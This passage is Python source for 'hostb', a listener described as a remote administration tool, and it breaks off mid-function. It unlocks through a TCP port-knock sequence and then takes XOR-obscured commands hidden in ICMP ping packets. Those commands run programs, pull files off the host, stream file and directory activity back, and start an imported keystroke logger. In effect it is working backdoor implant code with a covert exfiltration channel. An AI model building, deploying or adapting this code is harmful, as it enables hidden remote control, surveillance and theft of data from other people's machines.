"""hostb: knock-then-command listener for the remote administration tool.

Usage:
    sudo python3 hostb.py -i <interface>
"""

import argparse
import hashlib
import os
import select
import shutil
import signal
import socket
import struct
import subprocess
import sys
import threading
import time
from dataclasses import dataclass, field
from datetime import datetime

from scapy.all import AsyncSniffer, ICMP, IP, TCP

from hotkeys import start_logger, stop_logger

KNOCK_PORTS = (7000, 8000, 9000)
KNOCK_TIMEOUT_SECONDS = 5.0
ACK_SOURCE_PORT = 9000
ACK_DESTINATION_PORT = 54321
TTL = 64
CMD_DISCONNECT = 1
CMD_TRANSFER_FILE = 2
CMD_UNINSTALL = 3
CMD_RUN_PROGRAM = 4
CMD_REQUEST_FILE = 5
CMD_WATCH_FILE = 6
CMD_WATCH_DIR = 7
CMD_RUN_BG = 8
CMD_STOP_BG = 9
ACK_READY = 0xFFFE
ACK_META = 0xFFFD
ACK_CHUNK = 0xFFFC
ACK_END = 0xFFFB
WATCH_STOP = 0xFFF7

# Watch settings.
WATCH_TIMEOUT_SECONDS = 600.0          # 10-minute hard ceiling per watch session

RECEIVED_DIRECTORY = "received"
RECEIVED_FALLBACK_NAME = "received_file"
FILE_TRANSFER_TIMEOUT_SECONDS = 10.0

# File transfer: chunked stop-and-wait protocol (matches hosta).
CHUNK_PACKETS = 1024
CHUNK_BYTES = CHUNK_PACKETS * 2
METADATA_TIMEOUT_SECONDS = 10.0
CHUNK_RECV_TIMEOUT_SECONDS = 10.0
END_DRAIN_TIMEOUT_SECONDS = 3.0
RECV_BUFFER_BYTES = 8 * 1024 * 1024       # fat recv buffer to absorb chunk bursts

# Reserved sequence values matching hosta.
CHUNK_HEADER_SEQ = 0
END_SEQ = 0xFFFF
META_FILENAME_LENGTH_SEQ = 1
META_FILE_SIZE_HI_SEQ = 2
META_FILE_SIZE_LO_SEQ = 3
META_FILENAME_FIRST_SEQ = 4

# Byte-stream metadata (run-program command and output): just the 32-bit size.
STREAM_SIZE_HI_SEQ = 1
STREAM_SIZE_LO_SEQ = 2

# Chunk-send pacing on the sender side (matches hosta CHUNK_PACKET_DELAY_SECONDS).
CHUNK_PACKET_DELAY_SECONDS = 0.0001
META_ACK_TIMEOUT_SECONDS = 5.0
CHUNK_ACK_TIMEOUT_SECONDS = 5.0
END_ACK_TIMEOUT_SECONDS = 3.0
MAX_CHUNK_RETRIES = 5

# Run-program limits.
MAX_OUTPUT_BYTES = 0xFFFFFFFF                # 32-bit size header lifts the old 64KB cap
SUBPROCESS_TIMEOUT_SECONDS = 30.0

# Outbound file (option 5: hosta requests a file from hostb): same 4GB protocol cap.
MAX_OUTBOUND_FILE_BYTES = 0xFFFFFFFF

# Mimic Linux `ping`: 8-byte timestamp slot (zeroed) + 48 bytes of the
# 0x10..0x3F filler pattern. hosta ignores this payload — it only reads
# the identifier and sequence header fields.
PING_PAYLOAD = b"\x00" * 8 + bytes(range(0x10, 0x40))

BPF_KNOCK = (
    "tcp[tcpflags] & (tcp-syn|tcp-ack) == tcp-syn and ("
    + " or ".join(f"dst port {p}" for p in KNOCK_PORTS)
    + ")"
)
BPF_COMMAND = "icmp[icmptype] = icmp-echo"


@dataclass
class HostbArgs:
    iface: str | None
    key: str


@dataclass
class Context:
    args: HostbArgs | None = None
    error_message: str | None = None
    error_code: int = 1
    iface: str | None = None
    connected_to: str | None = None
    connected: bool = False
    key: int = 0
    stop_requested: threading.Event = field(default_factory=threading.Event)


@dataclass
class KnockProgress:
    knocks_received: int
    sequence_started_at: float


# ---------------------------------------------------------------------------
# Protocol helpers
# ---------------------------------------------------------------------------

def detect_source_ip(destination_ip):
    probe = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        probe.connect((destination_ip, 1))
        return probe.getsockname()[0]
    finally:
        probe.close()


def compute_checksum(data):
    if len(data) % 2:
        data += b"\x00"
    total = 0
    for i in range(0, len(data), 2):
        total += (data[i] << 8) + data[i + 1]
        total = (total & 0xFFFF) + (total >> 16)
    return ~total & 0xFFFF


def build_ip_header(source_ip, destination_ip, total_length, protocol=socket.IPPROTO_TCP):
    def with_checksum(checksum):
        return struct.pack(
            "!BBHHHBBH4s4s",
            0x45,                     # version 4, header length 5 (20 bytes)
            0,                        # type of service
            total_length,
            0,                        # identification
            0,                        # flags + fragment offset
            TTL,
            protocol,
            checksum,
            socket.inet_aton(source_ip),
            socket.inet_aton(destination_ip),
        )
    return with_checksum(compute_checksum(with_checksum(0)))


def build_tcp_ack_header(source_ip, destination_ip):
    def with_checksum(checksum):
        return struct.pack(
            "!HHLLBBHHH",
            ACK_SOURCE_PORT,
            ACK_DESTINATION_PORT,
            0,                        # sequence number
            1,                        # ack number
            0x50,                     # data offset 5 (20 bytes), reserved 0
            0x10,                     # flags: ACK only
            65535,                    # window
            checksum,
            0,                        # urgent pointer
        )
    pseudo = struct.pack(
        "!4s4sBBH",
        socket.inet_aton(source_ip),
        socket.inet_aton(destination_ip),
        0,
        socket.IPPROTO_TCP,
        20,                           # TCP header length
    )
    return with_checksum(compute_checksum(pseudo + with_checksum(0)))


def build_icmp_echo_request(identifier_encrypted, sequence):
    def with_checksum(checksum):
        header = struct.pack(
            "!BBHHH",
            8,                         # type: echo request
            0,                         # code
            checksum,
            identifier_encrypted,
            sequence,
        )
        return header
        # return header + PING_PAYLOAD  # uncomment to mimic Linux ping payload
    return with_checksum(compute_checksum(with_checksum(0)))


def derive_key(key_string):
    digest = hashlib.sha256(key_string.encode("utf-8")).digest()
    return (digest[0] << 8) | digest[1]


def encrypt_identifier(plaintext, key):
    return (plaintext ^ key) & 0xFFFF


def decrypt_identifier(ciphertext, key):
    return (ciphertext ^ key) & 0xFFFF


def open_raw_send_socket():
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    return sock


def open_raw_icmp_recv_socket():
    """Open SOCK_RAW for ICMP with a fat receive buffer so a burst of
    chunk packets won't overflow the kernel queue before Python drains it."""
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
    force_opt = getattr(socket, "SO_RCVBUFFORCE", None)
    if force_opt is not None:
        try:
            sock.setsockopt(socket.SOL_SOCKET, force_opt, RECV_BUFFER_BYTES)
            return sock
        except OSError:
            pass
    try:
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, RECV_BUFFER_BYTES)
    except OSError:
        pass
    return sock


class KnockWatcher:
    def __init__(self, on_authenticated):
        self.in_progress: dict[str, KnockProgress] = {}
        self.lock = threading.Lock()
        self.on_authenticated = on_authenticated

    def __call__(self, packet):
        if not (packet.haslayer(IP) and packet.haslayer(TCP)):
            return

        source_ip = packet[IP].src
        destination_port = int(packet[TCP].dport)
        now = time.time()
        sequence_complete = False

        with self.lock:
            progress = self.in_progress.get(source_ip)

            if progress and now - progress.sequence_started_at > KNOCK_TIMEOUT_SECONDS:
                progress = None
                self.in_progress.pop(source_ip, None)

            next_knock_index = progress.knocks_received if progress else 0
            already_accepted_ports = KNOCK_PORTS[:next_knock_index]

            # Loopback can deliver the same SYN twice; ignore the echo.
            if progress and destination_port in already_accepted_ports:
                return

            expected_port = KNOCK_PORTS[next_knock_index]
            if destination_port != expected_port:
                self.in_progress.pop(source_ip, None)
                return

            knocks_received = next_knock_index + 1
            print(f"[{knocks_received}/{len(KNOCK_PORTS)}] {source_ip} -> :{destination_port}")

            sequence_complete = knocks_received == len(KNOCK_PORTS)
            if sequence_complete:
                self.in_progress.pop(source_ip, None)
                print(f"[AUTH] {source_ip}")
            else:
                sequence_started_at = progress.sequence_started_at if progress else now
                self.in_progress[source_ip] = KnockProgress(
                    knocks_received=knocks_received,
                    sequence_started_at=sequence_started_at,
                )

        if sequence_complete:
            self.on_authenticated(source_ip)


class CommandWatcher:
    def __init__(self, expected_source, key):
        self.expected_source = expected_source
        self.key = key
        self.command_code: int | None = None
        self.command_received = threading.Event()

    def __call__(self, packet):
        if self.command_received.is_set():
            return
        if not (packet.haslayer(IP) and packet.haslayer(ICMP)):
            return
        if packet[IP].src != self.expected_source:
            return
        icmp = packet[ICMP]
        if int(icmp.type) != 8:  # echo request only
            return

        encrypted = int(icmp.id) & 0xFFFF
        sequence = int(icmp.seq) & 0xFFFF
        command_code = decrypt_identifier(encrypted, self.key)
        print(
            f"[CMD] from {self.expected_source} "
            f"id={encrypted:#06x} -> cmd={command_code} seq={sequence}"
        )
        self.command_code = command_code
        self.command_received.set()


def send_ack(raw_socket, source_ip, destination_ip, key, identifier_sentinel, sequence=1):
    icmp = build_icmp_echo_request(encrypt_identifier(identifier_sentinel, key), sequence)
    ip = build_ip_header(source_ip, destination_ip, 20 + len(icmp), socket.IPPROTO_ICMP)
    raw_socket.sendto(ip + icmp, (destination_ip, 0))


def send_icmp_identifier(send_socket, source_ip, destination_ip, identifier_encrypted, sequence):
    icmp = build_icmp_echo_request(identifier_encrypted, sequence)
    ip = build_ip_header(source_ip, destination_ip, 20 + len(icmp), socket.IPPROTO_ICMP)
    send_socket.sendto(ip + icmp, (destination_ip, 0))


def send_chunk(send_socket, source_ip, destination_ip, key, chunk_index, chunk_bytes):
    """Send one chunk: header packet (seq=CHUNK_HEADER_SEQ, id=chunk_index)
    followed by data packets seq=1..N each carrying two bytes."""
    send_icmp_identifier(
        send_socket, source_ip, destination_ip,
        encrypt_identifier(chunk_index, key), CHUNK_HEADER_SEQ,
    )
    if CHUNK_PACKET_DELAY_SECONDS > 0:
        time.sleep(CHUNK_PACKET_DELAY_SECONDS)
    chunk_length = len(chunk_bytes)
    num_packets = (chunk_length + 1) // 2
    for packet_index in range(num_packets):
        byte_offset = packet_index * 2
        high = chunk_bytes[byte_offset]
        low = chunk_bytes[byte_offset + 1] if byte_offset + 1 < chunk_length else 0
        word = (high << 8) | low
        send_icmp_identifier(
            send_socket, source_ip, destination_ip,
            encrypt_identifier(word, key), packet_index + 1,
        )
        if CHUNK_PACKET_DELAY_SECONDS > 0:
            time.sleep(CHUNK_PACKET_DELAY_SECONDS)


def wait_for_ack(recv_socket, source_ip, key, expected_identifier, expected_sequence, timeout):
    """Wait for an ICMP echo from source_ip with the decrypted identifier matching
    expected_identifier (and matching expected_sequence if not None)."""
    deadline = time.time() + timeout
    while True:
        remaining = deadline - time.time()
        result = _read_icmp_echo(recv_socket, source_ip, remaining)
        if result is None:
            return False
        if result == ():
            continue
        sequence, identifier = result
        if decrypt_identifier(identifier, key) != expected_identifier:
            continue
        if expected_sequence is not None and sequence != expected_sequence:
            continue
        return True


def _read_icmp_echo(recv_socket, source_ip, remaining):
    """Block up to `remaining` seconds for one ICMP echo request from source_ip.
    Returns (sequence, decryptable_identifier_int) or None on timeout/non-match."""
    if remaining <= 0:
        return None
    recv_socket.settimeout(remaining)
    try:
        packet, _ = recv_socket.recvfrom(65535)
    except socket.timeout:
        return None
    if len(packet) < 28:
        return ()  # malformed; caller should keep waiting
    ip_header_length = (packet[0] & 0x0F) * 4
    if len(packet) < ip_header_length + 8:
        return ()
    if socket.inet_ntoa(packet[12:16]) != source_ip:
        return ()
    icmp_header = packet[ip_header_length:ip_header_length + 8]
    icmp_type, _code, _chk, identifier, sequence = struct.unpack("!BBHHH", icmp_header)
    if icmp_type != 8:
        return ()
    return sequence, identifier


def receive_metadata(recv_socket, source_ip, key, timeout):
    """Collect metadata packets and return (filename_length, file_size, filename_bytes)
    or None on timeout. Metadata layout:
      seq=1: filename_length
      seq=2: file_size hi 16 bits
      seq=3: file_size lo 16 bits
      seq=4..3+M: filename bytes (2 per packet)."""
    packets: dict[int, int] = {}
    filename_length: int | None = None
    expected_filename_packets: int | None = None
    deadline = time.time() + timeout

    while True:
        remaining = deadline - time.time()
        result = _read_icmp_echo(recv_socket, source_ip, remaining)
        if result is None:
            return None
        if result == ():
            continue
        sequence, identifier = result
        packets[sequence] = decrypt_identifier(identifier, key)

        if filename_length is None and META_FILENAME_LENGTH_SEQ in packets:
            filename_length = packets[META_FILENAME_LENGTH_SEQ]
            expected_filename_packets = (filename_length + 1) // 2

        if filename_length is not None:
            needed = {
                META_FILENAME_LENGTH_SEQ,
                META_FILE_SIZE_HI_SEQ,
                META_FILE_SIZE_LO_SEQ,
            }
            needed |= set(range(
                META_FILENAME_FIRST_SEQ,
                META_FILENAME_FIRST_SEQ + expected_filename_packets,
            ))
            if needed <= packets.keys():
                break

    file_size = (packets[META_FILE_SIZE_HI_SEQ] << 16) | packets[META_FILE_SIZE_LO_SEQ]
    filename_buf = bytearray()
    for i in range(expected_filename_packets):
        value = packets[META_FILENAME_FIRST_SEQ + i]
        filename_buf.append((value >> 8) & 0xFF)
        filename_buf.append(value & 0xFF)
    return filename_length, file_size, bytes(filename_buf[:filename_length])


def receive_chunk(recv_socket, send_socket, source_ip, my_ip, key,
                  expected_chunk_index, expected_packets, chunks_written, timeout):
    """Receive a single chunk worth of data packets. Returns (bytes, None) on success
    or (None, missing_count) on timeout so the caller can log how much was lost.

    Handles three cases inline:
      * Duplicate chunk header for an already-written chunk -> re-ACK and keep waiting.
      * Chunk header for the expected chunk -> reset buffer and restart per-attempt timer.
      * Stray data packets before a header arrives -> ignored."""
    packets: dict[int, int] = {}
    saw_header = False
    deadline = time.time() + timeout

    while True:
        remaining = deadline - time.time()
        result = _read_icmp_echo(recv_socket, source_ip, remaining)
        if result is None:
            return None, expected_packets - len(packets)
        if result == ():
            continue
        sequence, identifier = result
        value = decrypt_identifier(identifier, key)

        if sequence == CHUNK_HEADER_SEQ:
            chunk_index = value
            if chunk_index in chunks_written:
                send_ack(send_socket, my_ip, source_ip, key, ACK_CHUNK, sequence=chunk_index)
                continue
            if chunk_index != expected_chunk_index:
                continue
            packets = {}
            saw_header = True
            deadline = time.time() + timeout
            continue

        if not saw_header:
            continue
        if 1 <= sequence <= expected_packets:
            packets[sequence] = value
            if len(packets) >= expected_packets:
                out = bytearray()
                for i in range(1, expected_packets + 1):
                    v = packets.get(i)
                    if v is None:
                        # Should not happen because the count check passed.
                        return None, expected_packets - len(packets)
                    out.append((v >> 8) & 0xFF)
                    out.append(v & 0xFF)
                return bytes(out), None


def drain_for_end(recv_socket, send_socket, source_ip, my_ip, key, chunks_written, timeout):
    """After the final chunk is written, keep listening briefly for the END marker
    and re-ACK any duplicate chunk headers from in-flight hosta retries."""
    deadline = time.time() + timeout
    while True:
        remaining = deadline - time.time()
        result = _read_icmp_echo(recv_socket, source_ip, remaining)
        if result is None:
            return
        if result == ():
            continue
        sequence, identifier = result
        value = decrypt_identifier(identifier, key)
        if sequence == END_SEQ:
            send_ack(send_socket, my_ip, source_ip, key, ACK_END)
            return
        if sequence == CHUNK_HEADER_SEQ and value in chunks_written:
            send_ack(send_socket, my_ip, source_ip, key, ACK_CHUNK, sequence=value)


def _send_watch_event_line(send_socket, source_ip, dest_ip, key, line):
    """Send one inotify event line to hosta with no ACK (fire-and-forget).
    seq=0 carries the byte length; seq=1..N carry 2 bytes of UTF-8 text each."""
    text = line.encode("utf-8")
    n = len(text)
    send_icmp_identifier(send_socket, source_ip, dest_ip,
                         encrypt_identifier(n, key), 0)
    for i in range((n + 1) // 2):
        off = i * 2
        hi = text[off]
        lo = text[off + 1] if off + 1 < n else 0
        send_icmp_identifier(send_socket, source_ip, dest_ip,
                             encrypt_identifier((hi << 8) | lo, key), i + 1)


def _watch_and_stream(ctx: Context, recursive: bool):
    """Receive the path to watch from hosta, start inotify, and stream events back
    until hosta sends WATCH_STOP or WATCH_TIMEOUT_SECONDS elapses."""
    try:
        from inotify_simple import INotify, flags as iflags
    except ImportError:
        print("[WATCH] inotify_simple not installed. Run: pip install inotify_simple")
        return

    if recursive:
        # Directory watch: track what changes inside the folder plus the folder itself.
        watch_flags = (
            iflags.CREATE | iflags.DELETE |
            iflags.MOVED_FROM | iflags.MOVED_TO |
            iflags.MODIFY | iflags.CLOSE_WRITE |
            iflags.ATTRIB |
            iflags.DELETE_SELF | iflags.MOVE_SELF
        )
        PRIORITY_EVENTS = [
            (iflags.MOVED_TO,     "MOVED_TO"),
            (iflags.MOVED_FROM,   "MOVED_FROM"),
            (iflags.CREATE,       "CREATE"),
            (iflags.DELETE,       "DELETE"),
            (iflags.CLOSE_WRITE,  "CLOSE_WRITE"),
            (iflags.MODIFY,       "MODIFY"),
            (iflags.ATTRIB,       "ATTRIB"),
            (iflags.DELETE_SELF,  "DELETE_SELF"),
            (iflags.MOVE_SELF,    "MOVE_SELF"),
        ]
    else:
        # File watch: track reads, writes, metadata changes, and the file's own fate.
        watch_flags = (
            iflags.OPEN | iflags.ACCESS |
            iflags.MODIFY | iflags.CLOSE_WRITE | iflags.CLOSE_NOWRITE |
            iflags.ATTRIB |
            iflags.DELETE_SELF | iflags.MOVE_SELF
        )
        PRIORITY_EVENTS = [
            (iflags.OPEN,         "OPEN"),
            (iflags.ACCESS,       "ACCESS"),
            (iflags.MODIFY,       "MODIFY"),
            (iflags.CLOSE_WRITE,  "CLOSE_WRITE"),
            (iflags.CLOSE_NOWRITE,"CLOSE_NOWRITE"),
            (iflags.ATTRIB,       "ATTRIB"),
            (iflags.DELETE_SELF,  "DELETE_SELF"),
            (iflags.MOVE_SELF,    "MOVE_SELF"),
        ]

    source_ip = detect_source_ip(ctx.connected_to)
    try:
        recv_socket = open_raw_icmp_recv_socket()
        send_socket = open_raw_send_socket()
    except PermissionError:
        ctx.error_message = "permission denied (raw sockets require sudo)"
        handle_error(ctx)

    try:
        try:
            send_ack(send_socket, source_ip, ctx.connected_to, ctx.key, ACK_READY)
        except OSError as exc:
            ctx.error_message = f"failed to send ack_ready: {exc}"
            ctx.error_code = 2
            handle_error(ctx)
        print(f"[ACK_READY] sent to {ctx.connected_to}")

        path_bytes = receive_byte_stream_chunked(
            recv_socket, send_socket, source_ip, ctx.connected_to,
            ctx.key, METADATA_TIMEOUT_SECONDS,
        )
        if path_bytes is None:
            print("[WATCH] path receive failed; aborting")
            return
        watch_path = path_bytes.decode("utf-8", errors="replace")
        print(f"[WATCH] path={watch_path!r} recursive={recursive}")

        if not os.path.exists(watch_path):
            print(f"[WATCH] path does not exist: {watch_path}")
            try:
                send_icmp_identifier(send_socket, source_ip, ctx.connected_to,
                                     encrypt_identifier(0, ctx.key), END_SEQ)
            except OSError:
                pass
            return

        inotify = INotify()
        inotify.add_watch(watch_path, watch_flags)
        if recursive and os.path.isdir(watch_path):
            for root, dirs, _ in os.walk(watch_path):
                for d in dirs:
                    inotify.add_watch(os.path.join(root, d), watch_flags)

        print(f"[WATCH] watching — send stop from hosta or wait {WATCH_TIMEOUT_SECONDS}s")
        deadline = time.time() + WATCH_TIMEOUT_SECONDS
        inotify_fd = inotify.fileno()

        while time.time() < deadline and not ctx.stop_requested.is_set():
            # Wait on BOTH the raw socket (WATCH_STOP) and the inotify fd (fs events)
            # so either one wakes the loop immediately instead of polling.
            remaining = min(1.0, deadline - time.time())
            try:
                readable, _, _ = select.select([recv_socket, inotify_fd], [], [], remaining)
            except OSError:
                break

            if recv_socket in readable:
                # Drain all queued packets so WATCH_STOP isn't buried behind others.
                stop_received = False
                while True:
                    r, _, _ = select.select([recv_socket], [], [], 0)
                    if not r:
                        break
                    try:
                        packet, _ = recv_socket.recvfrom(65535)
                        if len(packet) >= 28:
                            ihl = (packet[0] & 0x0F) * 4
                            if len(packet) >= ihl + 8:
                                icmp_hdr = packet[ihl:ihl + 8]
                                icmp_type, _, _, identifier, _ = struct.unpack(
                                    "!BBHHH", icmp_hdr)
                                if (icmp_type == 8 and
                                        decrypt_identifier(identifier, ctx.key) == WATCH_STOP):
                                    print("[WATCH] stop signal received")
                                    stop_received = True
                    except OSError:
                        break
                if stop_received:
                    break

            if inotify_fd in readable:
                events = inotify.read(timeout=0)
                for event in events:
                    names = [name for flag, name in PRIORITY_EVENTS if event.mask & flag]
                    if not names:
                        continue
                    is_dir = bool(event.mask & iflags.ISDIR)
                    suffix = " [DIR]" if is_dir else ""
                    event_type = "|".join(names)
                    ts = datetime.now().strftime("%H:%M:%S")
                    line = f"{ts}  {event_type:<20} {event.name}{suffix}"
                    print(f"[WATCH] {line}")
                    try:
                        _send_watch_event_line(send_socket, source_ip,
                                               ctx.connected_to, ctx.key, line)
                    except OSError as exc:
                        print(f"[WATCH] send error: {exc}")

        inotify.close()
        try:
            send_icmp_identifier(send_socket, source_ip, ctx.connected_to,
                                 encrypt_identifier(0, ctx.key), END_SEQ)
        except OSError:
            pass
        print("[WATCH] done")
    finally:
        recv_socket.close()
        send_socket.close()


def receive_byte_metadata(recv_socket, source_ip, key, timeout):
    """Receive the 2-packet byte-stream metadata header: seq=1 size_hi, seq=2 size_lo.
    Returns the 32-bit byte count or None on timeout."""
    packets: dict[int, int] = {}
    deadline = time.time() + timeout
    while True:
        remaining = deadline - time.time()
        result = _read_icmp_echo(recv_socket, source_ip, remaining)
        if result is None:
            return None
        if result == ():
            continue
        sequence, identifier = result
        if sequence in (STREAM_SIZE_HI_SEQ, STREAM_SIZE_LO_SEQ):
            packets[sequence] = decrypt_identifier(identifier, key)
            if STREAM_SIZE_HI_SEQ in packets and STREAM_SIZE_LO_SEQ in packets:
                return (packets[STREAM_SIZE_HI_SEQ] << 16) | packets[STREAM_SIZE_LO_SEQ]


def send_byte_stream_chunked(send_socket, recv_socket, my_ip, peer_ip, key, payload):
    """Send `payload` to peer using the chunk+ACK protocol.
    Sequence: metadata (size_hi, size_lo) -> wait ACK_META -> per-chunk
    send+wait ACK_CHUNK with retries -> fire-and-forget END -> wait ACK_END.
    Returns True on success, False otherwise."""
    byte_count = len(payload)
    byte_count_hi = (byte_count >> 16) & 0xFFFF
    byte_count_lo = byte_count & 0xFFFF
    try:
        send_icmp_identifier(send_socket, my_ip, peer_ip,
                             encrypt_identifier(byte_count_hi, key), STREAM_SIZE_HI_SEQ)
        send_icmp_identifier(send_socket, my_ip, peer_ip,
                             encrypt_identifier(byte_count_lo, key), STREAM_SIZE_LO_SEQ)
    except OSError:
        return False
    if not wait_for_ack(recv_socket, peer_ip, key, ACK_META, None, META_ACK_TIMEOUT_SECONDS):
        return False

    total_chunks = 0 if byte_count == 0 else (byte_count + CHUNK_BYTES - 1) // CHUNK_BYTES
    for chunk_index in range(total_chunks):
        chunk_start = chunk_index * CHUNK_BYTES
        chunk_data = payload[chunk_start:chunk_start + CHUNK_BYTES]
        acked = False
        for attempt in range(1, MAX_CHUNK_RETRIES + 1):
            try:
                send_chunk(send_socket, my_ip, peer_ip, key, chunk_index, chunk_data)
            except OSError:
                return False
            if wait_for_ack(recv_socket, peer_ip, key, ACK_CHUNK, chunk_index,
                            CHUNK_ACK_TIMEOUT_SECONDS):
                acked = True
                break
            print(f"  chunk {chunk_index} ack timed out (attempt {attempt}/{MAX_CHUNK_RETRIES})")
        if not acked:
            return False

    try:
        send_icmp_identifier(send_socket, my_ip, peer_ip,
                             encrypt_identifier(0, key), END_SEQ)
    except OSError:
        pass
    wait_for_ack(recv_socket, peer_ip, key, ACK_END, None, END_ACK_TIMEOUT_SECONDS)
    return True


def receive_byte_stream_chunked(recv_socket, send_socket, my_ip, peer_ip, key, metadata_timeout):
    """Receive a chunked byte stream. Returns the assembled bytes or None on failure."""
    byte_count = receive_byte_metadata(recv_socket, peer_ip, key, metadata_timeout)
    if byte_count is None:
        return None
    try:
        send_ack(send_socket, my_ip, peer_ip, key, ACK_META)
    except OSError:
        return None

    output = bytearray()
    total_chunks = 0 if byte_count == 0 else (byte_count + CHUNK_BYTES - 1) // CHUNK_BYTES
    chunks_written: set[int] = set()
    for chunk_index in range(total_chunks):
        chunk_byte_count = min(CHUNK_BYTES, byte_count - chunk_index * CHUNK_BYTES)
        expected_packets = (chunk_byte_count + 1) // 2
        chunk_bytes, missing = receive_chunk(
            recv_socket, send_socket, peer_ip, my_ip, key,
            chunk_index, expected_packets, chunks_written, CHUNK_RECV_TIMEOUT_SECONDS,
        )
        if chunk_bytes is None:
            print(f"  chunk {chunk_index} receive failed "
                  f"(missing {missing}/{expected_packets} packets)")
            return None
        output.extend(chunk_bytes[:chunk_byte_count])
        chunks_written.add(chunk_index)
        try:
            send_ack(send_socket, my_ip, peer_ip, key, ACK_CHUNK, sequence=chunk_index)
        except OSError:
            return None

    drain_for_end(recv_socket, send_socket, peer_ip, my_ip, key,
                  chunks_written, END_DRAIN_TIMEOUT_SECONDS)
    return bytes(output)


# ---------------------------------------------------------------------------
# FSM state functions
# ---------------------------------------------------------------------------

def handle_error(ctx: Context):
    sys.stderr.write(f"\nError: {ctx.error_message}\n")
    sys.stderr.write(f"Exit Code: {ctx.error_code}\n")
    sys.exit(ctx.error_code)


def parse_arguments(ctx: Context, argv: list[str] | None = None):
    parser = argparse.ArgumentParser(
        prog="hostb",
        description="Knock-then-command listener for the remote administration tool.",
    )
    parser.add_argument("-i", "--interface", dest="iface", required=False,
                        metavar="<interface>",
                        help="network interface to sniff on (default: scapy default)")
    parser.add_argument("-k", "--key", dest="key", required=True,
                        metavar="<key>",
                        help="pre-shared key string (must match hosta)")
    try:
        parsed = parser.parse_args(argv)
    except SystemExit as exc:
        sys.exit(1 if exc.code else 0)

    ctx.args = HostbArgs(iface=parsed.iface, key=parsed.key)


def handle_arguments(ctx: Context):
    if not ctx.args.key:
        ctx.error_message = "key must be a non-empty string"
        handle_error(ctx)
    ctx.iface = ctx.args.iface
    ctx.key = derive_key(ctx.args.key)
    signal.signal(signal.SIGINT, lambda *_: ctx.stop_requested.set())
    signal.signal(signal.SIGTERM, lambda *_: ctx.stop_requested.set())


def wait_for_session(ctx: Context):
    result: dict[str, str | None] = {"hosta_ip": None}
    done = threading.Event()

    def on_authenticated(hosta_ip):
        result["hosta_ip"] = hosta_ip
        done.set()

    watcher = KnockWatcher(on_authenticated)
    sniffer = AsyncSniffer(iface=ctx.iface, filter=BPF_KNOCK, prn=watcher, store=False)
    sniffer.start()
    print(f"[KNOCK] listening on {ctx.iface or 'default'}; Ctrl+C to stop")

    try:
        while (
            sniffer.running
            and not done.is_set()
            and not ctx.stop_requested.is_set()
        ):
            time.sleep(0.1)
    finally:
        if sniffer.running:
            sniffer.stop(join=True)

    ctx.connected_to = result["hosta_ip"]


def establish_session(ctx: Context):
    if not ctx.connected_to:
        return

    source_ip = detect_source_ip(ctx.connected_to)
    try:
        raw_socket = open_raw_send_socket()
    except PermissionError:
        ctx.error_message = "permission denied (raw sockets require sudo)"
        handle_error(ctx)

    try:
        tcp_header = build_tcp_ack_header(source_ip, ctx.connected_to)
        ip_header = build_ip_header(source_ip, ctx.connected_to, 20 + len(tcp_header))
        try:
            raw_socket.sendto(
                ip_header + tcp_header,
                (ctx.connected_to, ACK_DESTINATION_PORT),
            )
        except OSError as exc:
            ctx.error_message = f"failed to send ack: {exc}"
            ctx.error_code = 2
            handle_error(ctx)
    finally:
        raw_socket.close()

    print(f"[ACK] sent to {ctx.connected_to}")
    ctx.connected = True
    print(f"[CONNECTED] {ctx.connected_to}")


def listen_for_command(ctx: Context) -> int | None:
    if not ctx.connected:
        return None

    watcher = CommandWatcher(expected_source=ctx.connected_to, key=ctx.key)
    sniffer = AsyncSniffer(iface=ctx.iface, filter=BPF_COMMAND, prn=watcher, store=False)
    sniffer.start()
    print(f"[CMD] waiting for commands from {ctx.connected_to}")

    try:
        while (
            sniffer.running
            and not watcher.command_received.is_set()
            and not ctx.stop_requested.is_set()
        ):
            time.sleep(0.1)
    finally:
        if sniffer.running:
            sniffer.stop(join=True)

    return watcher.command_code


def receive_file(ctx: Context):
    if not ctx.connected_to:
        return

    source_ip = detect_source_ip(ctx.connected_to)

    # Open the raw recv socket BEFORE sending ACK_READY so we don't miss
    # the first metadata packets that arrive right after hosta sees the ack.
    try:
        recv_socket = open_raw_icmp_recv_socket()
        send_socket = open_raw_send_socket()
    except PermissionError:
        ctx.error_message = "permission denied (raw sockets require sudo)"
        handle_error(ctx)

    output_path: str | None = None
    file_handle = None
    try:
        # Phase B: signal ready, then collect metadata.
        try:
            send_ack(send_socket, source_ip, ctx.connected_to, ctx.key, ACK_READY)
        except OSError as exc:
            ctx.error_message = f"failed to send ready ack: {exc}"
            ctx.error_code = 2
            handle_error(ctx)
        print(f"[ACK_READY] sent to {ctx.connected_to}")

        metadata = receive_metadata(recv_socket, ctx.connected_to, ctx.key,
                                    METADATA_TIMEOUT_SECONDS)
        if metadata is None:
            print("[FILE] metadata receive timed out")
            return
        filename_length, file_size, filename_bytes = metadata
        print(f"[FILE] metadata: filename_length={filename_length}, file_size={file_size}")

        try:
            decoded_name = filename_bytes.decode("utf-8")
        except UnicodeDecodeError:
            decoded_name = ""
        safe_name = os.path.basename(decoded_name.replace("\\", "/"))
        if not safe_name or safe_name in (".", "..") or "\x00" in safe_name:
            safe_name = RECEIVED_FALLBACK_NAME
        output_path = os.path.join(RECEIVED_DIRECTORY, safe_name)

        try:
            os.makedirs(RECEIVED_DIRECTORY, exist_ok=True)
            file_handle = open(output_path, "wb")
        except OSError as exc:
            ctx.error_message = f"failed to open {output_path}: {exc}"
            ctx.error_code = 2
            handle_error(ctx)

        try:
            send_ack(send_socket, source_ip, ctx.connected_to, ctx.key, ACK_META)
        except OSError as exc:
            ctx.error_message = f"failed to send meta ack: {exc}"
            ctx.error_code = 2
            handle_error(ctx)
        print(f"[ACK_META] sent; receiving file -> {output_path}")

        # Phase C: chunk loop.
        if file_size == 0:
            total_chunks = 0
        else:
            total_chunks = (file_size + CHUNK_BYTES - 1) // CHUNK_BYTES
        chunks_written: set[int] = set()

        for chunk_index in range(total_chunks):
            chunk_byte_count = min(CHUNK_BYTES, file_size - chunk_index * CHUNK_BYTES)
            expected_packets = (chunk_byte_count + 1) // 2

            chunk_bytes, missing = receive_chunk(
